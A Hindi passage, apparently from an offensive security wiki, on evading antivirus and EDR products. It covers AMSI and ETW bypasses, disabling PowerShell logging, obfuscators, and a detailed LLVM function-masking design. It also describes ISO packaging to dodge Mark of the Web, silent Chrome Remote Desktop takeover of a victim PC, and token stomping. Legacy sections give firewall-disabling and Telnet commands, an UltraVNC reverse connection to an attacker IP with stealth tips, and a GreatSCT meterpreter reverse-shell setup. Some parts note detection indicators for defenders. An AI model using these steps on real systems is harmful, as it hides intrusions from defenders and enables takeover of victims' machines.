आप वर्तमान process की memory से पता लगाए गए AMSI signature को हटाने के लिए **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** और **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** जैसे टूल का इस्तेमाल कर सकते हैं। यह टूल वर्तमान process की memory में AMSI signature को scan करके और फिर उसे NOP instructions से overwrite करके काम करता है, जिससे वह प्रभावी रूप से memory से हट जाता है।

**AMSI का इस्तेमाल करने वाले AV/EDR products**

आप **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** में AMSI का इस्तेमाल करने वाले AV/EDR products की सूची पा सकते हैं।

**Powershell version 2 का इस्तेमाल करें**
अगर आप PowerShell version 2 का इस्तेमाल करते हैं, तो AMSI लोड नहीं होगा, इसलिए आप अपनी scripts को AMSI द्वारा scan किए बिना चला सकते हैं। आप यह कर सकते हैं:

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell logging एक ऐसी सुविधा है, जो आपको सिस्टम पर चलाए गए सभी PowerShell commands को log करने देती है। यह auditing और troubleshooting के लिए उपयोगी हो सकती है, लेकिन **पहचान से बचना चाहने वाले attackers के लिए समस्या भी बन सकती है**।

PowerShell logging को bypass करने के लिए, आप ये techniques इस्तेमाल कर सकते हैं:

- **PowerShell Transcription और Module Logging को Disable करें**: इस उद्देश्य के लिए [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) जैसे tool का इस्तेमाल कर सकते हैं।
- **Powershell version 2 का इस्तेमाल करें**: अगर आप PowerShell version 2 इस्तेमाल करते हैं, तो AMSI load नहीं होगा, इसलिए आप अपनी scripts को AMSI द्वारा scan किए बिना चला सकते हैं। ऐसा करने के लिए: `powershell.exe -version 2`
- **Unmanaged PowerShell session का इस्तेमाल करें**: `powershell.exe` launch किए बिना PowerShell host करने के लिए [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) का इस्तेमाल करें (यह Cobalt Strike के `powerpick` द्वारा इस्तेमाल किया जाने वाला तरीका है)। इससे खास तौर पर `powershell.exe` process से जुड़े controls से बचा जा सकता है, लेकिन यह अपने-आप AMSI, Script Block Logging या PowerShell के हर दूसरे defense को disable नहीं करता; coverage runtime और host implementation पर निर्भर करती है।


## Obfuscation

> [!TIP]
> कई obfuscation techniques में data को encrypt किया जाता है, जिससे binary की entropy बढ़ जाती है और AVs तथा EDRs के लिए इसे detect करना आसान हो जाता है। इस बारे में सावधान रहें और शायद encryption केवल अपने code के उन खास हिस्सों पर लागू करें जो sensitive हैं या जिन्हें छिपाने की ज़रूरत है।

### ConfuserEx-Protected .NET Binaries को Deobfuscate करना

ConfuserEx 2 (या commercial forks) का इस्तेमाल करने वाले malware का analysis करते समय, protection की कई layers का सामना करना आम है, जो decompilers और sandboxes को रोक देती हैं। नीचे दिया गया workflow भरोसेमंद तरीके से **लगभग original IL को restore करता है**, जिसे बाद में dnSpy या ILSpy जैसे tools में C# में decompile किया जा सकता है।<sup>[[10]](#references)</sup>

1.  Anti-tampering हटाना – ConfuserEx हर *method body* को encrypt करता है और उसे *module* के static constructor (`<Module>.cctor`) के अंदर decrypt करता है। यह PE checksum को भी patch करता है, इसलिए किसी भी modification से binary crash हो जाएगी। Encrypted metadata tables खोजने, XOR keys recover करने और साफ assembly दोबारा लिखने के लिए **AntiTamperKiller** का इस्तेमाल करें:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Output में 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) होते हैं, जो अपना unpacker बनाते समय उपयोगी हो सकते हैं।

2.  Symbol / control-flow recovery – *clean* file को **de4dot-cex** (de4dot का ConfuserEx-aware fork) को दें।
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – ConfuserEx 2 profile चुनें
     • de4dot control-flow flattening को undo करेगा, original namespaces, classes और variable names को restore करेगा और constant strings को decrypt करेगा।

3.  Proxy-call stripping – ConfuserEx decompilation को और मुश्किल बनाने के लिए direct method calls को lightweight wrappers (जिन्हें *proxy calls* भी कहते हैं) से बदल देता है। इन्हें **ProxyCall-Remover** से हटाएँ:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   इस चरण के बाद आपको अपारदर्शी wrapper functions (`Class8.smethod_10`, …) के बजाय सामान्य .NET API, जैसे `Convert.FromBase64String` या `AES.Create()`, दिखाई देने चाहिए।

4.  मैन्युअल सफ़ाई – परिणामी binary को dnSpy में चलाएँ और बड़े Base64 blobs या `RijndaelManaged`/`TripleDESCryptoServiceProvider` के उपयोग को खोजें, ताकि *असली* payload का पता लगाया जा सके। अक्सर malware इसे `<Module>.byte_0` के अंदर initialize किए गए TLV-encoded byte array के रूप में रखता है।

यह श्रृंखला malicious sample चलाने की ज़रूरत के बिना execution flow को बहाल करती है — offline workstation पर काम करते समय यह उपयोगी है।

> 🛈  ConfuserEx `ConfusedByAttribute` नाम का एक custom attribute बनाता है, जिसका उपयोग samples को स्वचालित रूप से triage करने के लिए IOC के रूप में किया जा सकता है।

#### एक-लाइनर
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): इस project का उद्देश्य [LLVM](http://www.llvm.org/) compilation suite का ऐसा open-source fork उपलब्ध कराना है, जो [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) और tamper-proofing के ज़रिए software security को बेहतर बना सके।
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator दिखाता है कि किसी external tool का उपयोग किए बिना और compiler में बदलाव किए बिना, compile time पर obfuscated code generate करने के लिए `C++11/14` language का उपयोग कैसे किया जा सकता है।
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework से generate किए गए obfuscated operations की एक layer जोड़ें, जिससे application को crack करने की कोशिश करने वाले व्यक्ति का काम थोड़ा मुश्किल हो जाएगा।
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz एक x64 binary obfuscator है, जो कई तरह की pe files को obfuscate कर सकता है, जिनमें .exe, .dll, .sys शामिल हैं।
- [**metame**](https://github.com/a0rtega/metame): Metame arbitrary executables के लिए एक simple metamorphic code engine है।
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator, ROP (return-oriented programming) का उपयोग करने वाली LLVM-supported languages के लिए एक fine-grained code obfuscation framework है। ROPfuscator regular instructions को ROP chains में बदलकर assembly code level पर program को obfuscate करता है, जिससे सामान्य control flow की हमारी सहज अवधारणा बाधित होती है।
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt, Nim में लिखा गया .NET PE Crypter है।
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor मौजूदा EXE/DLL को shellcode में बदलकर फिर load कर सकता है।

### LLVM compiler-सहायता से प्रति-function self-masking

पूरे implant को केवल उसके सोते समय mask करने के बजाय, संशोधित LLVM X86 backend चुने हुए functions के inactive रहने पर उन्हें XOR-masked रख सकता है। Function Peekaboo PoC, demangled names में `REG_` खोजता है, final machine code के चारों ओर position-independent entry/exit stubs डालता है, और `.text` में एक साझा masking handler emit करता है; source-level signatures और Windows x64 calling convention अपरिवर्तित रहते हैं।<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow transformation

यह transformation instruction selection और optimization के बाद होना चाहिए, क्योंकि इसे **हर emitted return** को शामिल करना और सटीक x86 layout जानना आवश्यक है। Pre-emission `MachineFunctionPass`, आखिरी `MachineInstr::isReturn()` ढूँढ़ता है, उसे delete करता है ताकि अंतिम path appended epilogue में fall through हो, और उससे पहले के returns को `JMP_1 handler` से बदलता है। हर return से पहले compiler द्वारा generate किया गया stack/frame teardown बनाए रखें; केवल return instruction को redirect करें।<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` और `emitFunctionBodyEnd()` प्रति-function stubs emit करते हैं, जबकि `emitEndOfAsmFile()` handler emit करता है। Emission stages के बीच साझा symbols, prologue branch को उसके बाद वाले epilogue पर target करने देते हैं; manually emitted near `je` के लिए, `0F 84` लिखें और उसके बाद चार-byte MC expression `target - address_after_je` लिखें। Handler को किए जाने वाले calls और jumps को इसके बजाय `MCInst` objects (`CALL64pcrel32` और `JMP_1`) के रूप में emit किया जा सकता है। यदि किसी unselected function में कोई बदलाव नहीं हुआ है, तो pass को `false` लौटाना चाहिए; PoC इस path पर गलत तरीके से `true` लौटाता है।<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata और pre-CRT initialization

PoC `.funcmeta` में एक XOR key और 16-byte records रखता है, जिनमें loader-relocated function pointer और runtime length होते हैं। हालाँकि C field `uint32_t` है, handler record offset `+8` पर QWORD access करता है, जिससे length और उसका padding दोनों उपयोग होते हैं, और records को `0x10` से आगे बढ़ाता है। PE section names केवल आठ bytes के होते हैं, इसलिए runtime lookup को `.funcmet` दिखाई देता है। एक external patcher executable `.stub` जोड़ता है, stub में पुराना entry-point RVA save करता है और `AddressOfEntryPoint` को redirect करता है; PIC stub को `gs:[0x60]` → `[PEB+0x10]` से image base मिलता है, वह पहले से imported `VirtualProtect` को resolve करने के लिए PE32+ imports पर चलता है, और CRT से पहले execute होता है।<sup>[[38]](#references)[[39]](#references)</sup>

Initialization, `gs:[0xE8]` में sentinel set करता है और हर metadata function को call करता है। उसका हमेशा readable prologue, function start को `gs:[0xF0]` में record करता है, sentinel को detect करता है और अभी-clear body को skip करता है। इसके बाद epilogue `call handler` का उपयोग करता है; handler के 13 registers (`0x68` bytes) save करने के बाद, `[rsp+0x68]` पर return address transformed function का end होता है, इसलिए `end - start` को उसके metadata record में लिखा जा सकता है। सभी bodies के mask हो जाने पर stub sentinel clear करता है और `ImageBase + original_entry_point_RVA` पर jump करता है।<sup>[[38]](#references)[[39]](#references)</sup>

सामान्य call के दौरान, prologue body को decode करने के लिए उसी symmetric handler को call करता है। अंतिम path appended epilogue में fall through होता है, जबकि उससे पहले के हर return सीधे shared handler पर jump करते हैं। सामान्य epilogue भी `call` के बजाय `jmp handler` का उपयोग करता है, इसलिए re-masking के बाद handler का `ret`, original caller का return address consume करता है और function result को `RAX` में बनाए रखता है।<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive और analysis indicators

Handler मौजूदा record ढूँढ़ता है, fixed visible prologue (`इस build में 0x46` bytes) को skip करता है, बाकी हिस्से की protection को `PAGE_EXECUTE_READWRITE` में बदलता है, उसे low key byte से byte-by-byte XOR करता है, और फिर protection को `PAGE_EXECUTE_READ` पर set करता है। इसलिए यही loop entry पर decode और हर सामान्य exit पर encode करता है।<sup>[[38]](#references)[[39]](#references)</sup>

इस design के high-signal indicators में शामिल हैं:<sup>[[38]](#references)[[39]](#references)</sup>

- executable `.stub` के अंदर entry point और key तथा relocated `.text` pointers रखने वाला `.funcmet` section;
- pre-CRT PEB, import-table और section-table parsing, जिसके बाद हर metadata pointer के ज़रिए calls;
- समान `call`/`pop` PIC prologues और एक ही handler पर redirect किए गए कई return sites;
- `gs:[0xE8]`, `gs:[0xF0]` और `gs:[0xF8]` में writes, जिनके बाद बार-बार `VirtualProtect` transitions और image-backed executable pages में bytewise XOR writes होती हैं।

यह memory-scanner evasion है, cryptographic protection नहीं: patched file में original clear body अब भी मौजूद रहती है, और debugger `VirtualProtect` या XOR loop पर break करके active function dump कर सकता है। Single-byte XOR, readable metadata और fixed `0x46` boundary भी offline recovery को आसान बनाते हैं।<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> PoC के TEB slots thread-local हैं, लेकिन modified code pages process-wide हैं। इसलिए concurrent या recursive entry के दौरान instructions फिर से toggle हो सकती हैं, जबकि कोई दूसरी invocation execute हो रही हो; exceptions और nonlocal exits भी re-masking को bypass कर सकते हैं। एक robust implementation को transitions synchronize करने चाहिए, `lpflOldProtect` के ज़रिए वास्तव में लौटाई गई protection restore करनी चाहिए, hard-coded stub lengths से बचना चाहिए, x64 stack alignment के लिए `call` और `jmp` दोनों paths audit करने चाहिए, और executable bytes दोबारा लिखने के बाद `FlushInstructionCache` call करना चाहिए। Microsoft स्पष्ट रूप से executable code में बदलाव होने पर instruction-cache coherency की ज़िम्मेदारी caller पर डालता है।<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Internet से कुछ executables download करके execute करते समय आपने यह screen देखी होगी।

Microsoft Defender SmartScreen एक security mechanism है, जिसका उद्देश्य end user को संभावित रूप से malicious applications चलाने से बचाना है।

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen मुख्य रूप से reputation-based approach पर काम करता है; यानी जिन applications को आमतौर पर download नहीं किया जाता, वे SmartScreen trigger करेंगी, जिससे end user को alert किया जाएगा और file execute होने से रोकी जाएगी (हालाँकि More Info -> Run anyway पर click करके file फिर भी execute की जा सकती है)।

**MoTW** (Mark of The Web), Zone.Identifier नाम वाला एक [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) है, जो Internet से files download करने पर अपने-आप बनता है और इसमें उस URL का पता भी होता है जहाँ से file download की गई थी।

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Internet से download की गई file के Zone.Identifier ADS को जाँचना।</p></figcaption></figure>

> [!TIP]
> यह ध्यान रखना ज़रूरी है कि **trusted** signing certificate से signed executables **SmartScreen trigger नहीं करेंगे**।

अपने payloads को Mark of The Web मिलने से रोकने का एक बहुत प्रभावी तरीका है उन्हें ISO जैसे किसी container के अंदर package करना। ऐसा इसलिए होता है क्योंकि Mark-of-the-Web (MOTW) को **non NTFS** volumes पर लागू **नहीं** किया जा सकता।

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) एक ऐसा tool है, जो Mark-of-the-Web से बचने के लिए payloads को output containers में package करता है।

उपयोग का उदाहरण:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

यहाँ [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) का उपयोग करके ISO फ़ाइलों में payloads पैकेज करके SmartScreen को bypass करने का डेमो दिया गया है।

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW), Windows में एक शक्तिशाली logging mechanism है, जो applications और system components को **events log** करने देता है। हालाँकि, security products इसका उपयोग malicious activities को monitor और detect करने के लिए भी कर सकते हैं।

AMSI को disable (bypass) करने की तरह, user space process के **`EtwEventWrite`** function को बिना कोई event log किए तुरंत return करवाना भी संभव है। इसके लिए function को memory में patch करके तुरंत return करवाया जाता है, जिससे उस process के लिए ETW logging प्रभावी रूप से disable हो जाती है।

इस बारे में अधिक जानकारी **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) और [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** पर मिल सकती है।<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

C# binaries को memory में load करने की तकनीक काफी समय से मौजूद है और AV की पकड़ में आए बिना अपने post-exploitation tools चलाने का यह अब भी एक बेहतरीन तरीका है।

चूँकि payload सीधे memory में load होगा और disk को नहीं छुएगा, इसलिए हमें केवल पूरे process के लिए AMSI patch करने की चिंता करनी होगी।

अधिकांश C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, आदि) पहले से ही C# assemblies को सीधे memory में execute करने की सुविधा देते हैं, लेकिन ऐसा करने के अलग-अलग तरीके हैं:

- **Fork\&Run**

इसमें **एक नया sacrificial process शुरू करना**, अपने post-exploitation के malicious code को उस नए process में inject करना, उसे execute करना और काम पूरा होने पर नए process को kill करना शामिल है। इस तरीके के फायदे और नुकसान, दोनों हैं। Fork and run method का फायदा यह है कि execution हमारे Beacon implant process के **बाहर** होता है। इसका मतलब है कि अगर post-exploitation action में कुछ गड़बड़ होती है या वह पकड़ में आ जाता है, तो हमारे **implant के बच जाने की संभावना बहुत अधिक** होती है। इसका नुकसान यह है कि **Behavioural Detections** द्वारा पकड़े जाने की **संभावना अधिक** होती है।

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

इसमें post-exploitation के malicious code को **अपने ही process में** inject किया जाता है। इस तरह, आप नया process बनाने और उसे AV से scan करवाने से बच सकते हैं, लेकिन इसका नुकसान यह है कि payload execute करते समय कुछ गड़बड़ होने पर **अपना beacon खोने की संभावना बहुत अधिक** होती है, क्योंकि वह crash हो सकता है।

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> अगर आप C# Assembly loading के बारे में और पढ़ना चाहते हैं, तो यह लेख देखें [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) और उनका InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

आप **PowerShell से भी** C# Assemblies load कर सकते हैं। [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) और [S3cur3th1sSh1t का वीडियो](https://www.youtube.com/watch?v=oe11Q-3Akuk) देखें।

## .NET tools की NativeAOT WebAssembly रीपैकेजिंग (WasmForge)

सामान्य `execute-assembly` तकनीकें पहचानने योग्य MSIL को बनाए रखती हैं और अंततः CLR initialize करती हैं। **WasmForge** इसके बजाय execution substrate को बदलता है: यह C# project को experimental NativeAOT-LLVM WASI target पर migrate करता है, उसे WebAssembly में ahead of time compile करता है और उस module को Wazero-आधारित Windows PE host में embed करता है। परिणामी process को target के CLR, JIT या `dotnet` host की आवश्यकता नहीं होती, इसलिए केवल managed assembly names, CLR loading, AMSI या .NET ETW पर आधारित rules की सीधी visibility नहीं रहती। यह evasion/packaging technique है, privilege boundary bypass नहीं—guest के पास original tool की permissions और observable OS behavior ही रहते हैं।<sup>[[44]](#references)[[45]](#references)</sup>

### C# project build करना

Recommended build path project का Docker environment है, क्योंकि इसमें .NET 10 SDK, NativeAOT-LLVM workload, WASI SDK 24.0, linker और signing dependencies शामिल हैं। `.csproj` अपने आप detect हो जाता है; one-shot build migration, compatibility patching, WASM compilation, PE forging और signing करता है।<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Troubleshooting या generated code की समीक्षा के लिए, प्रक्रिया को `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm`, और अंत में `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>` में बाँटें। Build image में `wasm-component-ld` wrapper भी है, जो WASI Preview 2 component encoding से बचकर embedded runtime के अपेक्षित plain module को तैयार करता है।<sup>[[44]](#references)[[45]](#references)</sup>

### wasm32 C# को x64 Win32 से जोड़ना

यह पारदर्शी recompile नहीं है। NativeAOT-WASI में Windows-उन्मुख BCL सुविधाएँ अनुपलब्ध हैं या बदल जाती हैं, और wasm32 guest आम तौर पर चार-बाइट pointer slots आवंटित करता है, जबकि x64 APIs आठ-बाइट pointers लौटा सकते हैं। WasmForge इन दोनों समस्याओं को इन generated layers से हल करता है:<sup>[[44]](#references)</sup>

1. एक source patcher AOT-विशिष्ट semantic differences ठीक करता है और unsupported registry, pipes, WMI, identity, directory-service, file-version, LSA और इसी तरह की calls को `Wf*` helpers की ओर भेजता है।
2. एक P/Invoke scanner, NativeAOT `DirectPInvoke` mappings emit करता है, ताकि `[DllImport]` calls guest के भीतर घोषित DLL को dynamically load करने के बजाय linked C bridge symbols से bind हों।
3. Host-bound pointers के लिए C# में `ulong` और C में `uint64_t` इस्तेमाल होता है। एक generic dispatcher call को host के Win32 handler तक पहुँचाता है; `out8_mask` उन वास्तविक आठ-बाइट output slots को चिह्नित करता है जिनके upper halves को बनाए रखना ज़रूरी है। जिन unmarked outputs का आकार wasm32 जैसा होता है, उनके लिए snapshot/restore protection इस्तेमाल होता है, ताकि x64 write पास के चार bytes को corrupt न कर सके।
4. Dedicated host bridges उन operations को संभालते हैं जो generic syscall dispatch में फिट नहीं होते, जैसे LSA ticket-cache access, structured results वाले Kerberos/BCrypt operations, TCP KDC traffic और LDAP queries।

उदाहरण के लिए, `version.dll!VerQueryValueW` के लिए एक wrapper चार host addresses पास करता है और bits 2 और 3 (`0xC`) सेट करता है, क्योंकि value pointer और length आठ-बाइट output slots हैं। Wrapper generic ही रहता है और DLL name, export name, arguments और mask को `wf_call_v2` तक भेजता है; host pointer translation करता है और native API invoke करता है।<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### सीमाएँ और detection pivots

Reflection-heavy code, dynamic assembly loading, arbitrary native callbacks, और WASM memory में लौटाए जाने वाले complex x64 structures के लिए अब भी प्रत्येक tool के अनुसार patches की आवश्यकता हो सकती है या वे पूरी तरह विफल हो सकते हैं। Generic WASI Preview 2 sockets भी no-op stubs तक पहुँच सकते हैं, इसलिए समर्थित tools protocol-specific host shims का उपयोग करते हैं। Feature parity मान लेने के बजाय प्रत्येक command को native build के विरुद्ध validate करें।<sup>[[44]](#references)[[45]](#references)</sup>

यह technique payload को अदृश्य बनाने के बजाय telemetry को दूसरी जगह स्थानांतरित करती है। Detection का रुख ऐसे PE की ओर हो सकता है जिसमें WASM module हो या जो उसे materialize करता हो, Wazero-जैसे runtime behavior, असामान्य host/guest memory allocation और copying, generic direct Win32 dispatch, signing और PE-resource anomalies, साथ ही परिणामी API calls और network traffic। इसलिए CLR-load, AMSI, या .NET ETW events का न होना इस बात का प्रमाण नहीं मानना चाहिए कि कोई process benign है।<sup>[[44]](#references)</sup>

## अन्य Programming Languages का उपयोग

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) में प्रस्तावित तरीके के अनुसार, compromised machine को **Attacker Controlled SMB share पर install किए गए interpreter environment तक access देकर** अन्य languages में malicious code execute करना संभव है।

SMB share पर मौजूद Interpreter Binaries और environment तक access देकर आप compromised machine की **memory के भीतर इन languages में arbitrary code execute** कर सकते हैं।

Repo के अनुसार: Defender अब भी scripts scan करता है, लेकिन Go, Java, PHP आदि का उपयोग करके हमें **static signatures को bypass करने के लिए अधिक flexibility** मिलती है। इन languages में random, un-obfuscated reverse shell scripts के साथ testing सफल रही है।

## Static-analysis evasion के लिए WebAssembly re-hosting

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping, EDR या AV जैसे security product के access token में बदलाव करता है। Token के privileges कम करने से process चलता रह सकता है, जबकि उसे privileged inspection या remediation actions करने से रोका जा सकता है।

इसे रोकने के लिए Windows, **external processes** को security processes के tokens पर handles लेने से रोक सकता है।

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Trusted Software का उपयोग

### Chrome Remote Desktop

[**इस blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) में बताए अनुसार, पीड़ित के PC पर Chrome Remote Desktop deploy करना आसान है; फिर इसका उपयोग उस पर takeover करने और persistence बनाए रखने के लिए किया जा सकता है:<sup>[[35]](#references)</sup>
1. https://remotedesktop.google.com/ से download करें, "Set up via SSH" पर click करें, फिर MSI file download करने के लिए Windows वाली MSI file पर click करें।
2. Victim पर installer को silently run करें (admin आवश्यक): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop page पर वापस जाएँ और next पर click करें। Wizard आपसे authorize करने को कहेगा; जारी रखने के लिए Authorize button पर click करें।
4. दिए गए command को आवश्यक बदलावों के साथ execute करें: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (`--pin` parameter, GUI का उपयोग किए बिना PIN सेट करता है)।
 

## Advanced Evasion

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Evasion बहुत जटिल विषय है। कभी-कभी आपको एक ही system में telemetry के कई अलग-अलग स्रोतों को ध्यान में रखना पड़ता है, इसलिए mature environments में पूरी तरह undetected रहना लगभग असंभव है।

आप जिस भी environment का सामना करेंगे, उसकी अपनी strengths और weaknesses होंगी।

मैं आपको अत्यधिक प्रोत्साहित करता हूँ कि Advanced Evasion techniques की शुरुआती समझ पाने के लिए [@ATTL4S](https://twitter.com/DaniLJ94) की यह talk देखें।


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

यह [@mariuszbit](https://twitter.com/mariuszbit) की Evasion in Depth पर एक और बेहतरीन talk है।


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **पुरानी Techniques**

### **जाँचें कि Defender किन हिस्सों को malicious मानता है**

आप [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) का उपयोग कर सकते हैं, जो binary के हिस्सों को तब तक **हटाता है** जब तक उसे **पता न चल जाए कि Defender किस हिस्से को** malicious मान रहा है; फिर यह हिस्सा आपके लिए अलग कर देता है।\
**यही काम करने वाला** एक अन्य tool [**avred**](https://github.com/dobin/avred) है, जो [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) पर open web service के रूप में उपलब्ध है।

### **Telnet Server**

Windows10 तक, सभी Windows में एक **Telnet server** शामिल था, जिसे आप (administrator के रूप में) इस तरह install कर सकते थे:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

सिस्टम शुरू होने पर इसे **स्वतः शुरू** होने के लिए सेट करें और अभी **चलाएँ**:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Telnet पोर्ट बदलें** (stealth) और firewall अक्षम करें:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

इसे यहाँ से डाउनलोड करें: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (आपको bin downloads चाहिए, setup नहीं)

**HOST पर**: _**winvnc.exe**_ चलाएँ और server configure करें:

- _Disable TrayIcon_ विकल्प सक्षम करें
- _VNC Password_ में password सेट करें
- _View-Only Password_ में password सेट करें

फिर, binary _**winvnc.exe**_ और **अभी-अभी** बनाई गई फ़ाइल _**UltraVNC.ini**_ को **victim** में ले जाएँ

#### **Reverse connection**

**attacker** को अपने **host** पर binary `vncviewer.exe -listen 5900` चलानी चाहिए, ताकि वह reverse **VNC connection** पकड़ने के लिए **तैयार** रहे। फिर, **victim** पर: winvnc daemon शुरू करें `winvnc.exe -run` और चलाएँ `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Stealth बनाए रखने के लिए कुछ काम न करें

- अगर `winvnc` पहले से चल रहा है, तो उसे शुरू न करें, वरना [popup](https://i.imgur.com/1SROTTl.png) दिखाई देगा। जाँचें कि यह चल रहा है या नहीं: `tasklist | findstr winvnc`
- `UltraVNC.ini` को उसी directory में रखे बिना `winvnc` शुरू न करें, वरना [config window](https://i.imgur.com/rfMQWcf.png) खुल जाएगी
- मदद के लिए `winvnc -h` न चलाएँ, वरना [popup](https://i.imgur.com/oc18wcu.png) दिखाई देगा

### GreatSCT

इसे यहाँ से डाउनलोड करें: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

GreatSCT के अंदर:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

अब **lister को start करें** `msfconsole -r file.rc` के साथ और **xml payload** को **execute** करें:

```
